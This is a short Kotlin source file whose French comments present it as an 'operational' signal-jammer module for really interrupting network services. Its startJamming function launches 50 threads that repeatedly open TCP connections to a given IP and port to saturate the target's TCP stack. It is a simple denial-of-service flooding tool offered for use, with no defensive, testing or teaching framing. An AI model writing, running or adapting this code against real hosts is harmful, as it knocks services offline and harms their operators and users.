package com.fardc.sigint.core

import java.net.Socket
import kotlin.concurrent.thread

/**
 * MODULE SIGNAL-JAMMER OPÉRATIONNEL
 * Interruption réelle des services réseau par saturation
 */
class SignalJammer {
    private var isJamming = false

    fun startJamming(targetIp: String, targetPort: Int) {
        println("📡 [JAMMER] Initialisation de l'attaque sur $targetIp:$targetPort...")
        isJamming = true
        
        // Lancement de 50 threads d'interruption massive
        repeat(50) {
            thread {
                while (isJamming) {
                    try {
                        val socket = Socket(targetIp, targetPort)
                        // On maintient la connexion ouverte pour saturer la pile TCP de la cible
                        Thread.sleep(100) 
                    } catch (e: Exception) {
                        // Cible saturée ou refus de connexion
                    }
                }
            }
        }
    }

    fun stopJamming() {
        isJamming = false
        println("🛑 [JAMMER] Arrêt des opérations.")
    }
}
